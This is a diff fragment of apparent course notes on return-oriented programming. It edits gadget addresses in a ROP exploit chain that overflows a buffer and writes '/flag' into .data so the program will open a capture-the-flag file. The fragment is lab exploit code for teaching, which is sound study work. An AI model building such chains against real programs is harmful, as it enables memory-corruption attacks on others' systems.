@@ -43,10 +43,10 @@ OPEN THE FLAG and print value> [!PDF|] [[L13 Return-oriented Programming.pdf#pag
 
 p += "A"*56  
 p += pack('<Q', 0x00007ffff7decb6a) # pop rdi ; ret  
-p += pack('<Q', 0x0000000000404030) # @ .data  
-p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret  
+p += pack('<Q', 0x0000000000404028) # @ .data  
+p += pack('<Q', 0x00007ffff7dff174) # pop rax ; ret  
 p += '/flag'  
-p += pack('<Q', 0x00007ffff7e6b85b) # mov qword ptr [rdi], rax ; ret p += pack('<Q', 0x00007ffff7de7529) # pop rsi ; ret  
+p += pack('<Q', 0x00007ffff7e6b85b) # mov qword ptr [rdi], rax ; ret p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
 p += pack('<Q', 0x0000000000000000) # 0  
 p += pack('<Q', 0x00007ffff7ed0e50) # open64  
 p += pack('<Q', 0x00007ffff7f221e2) # mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret  
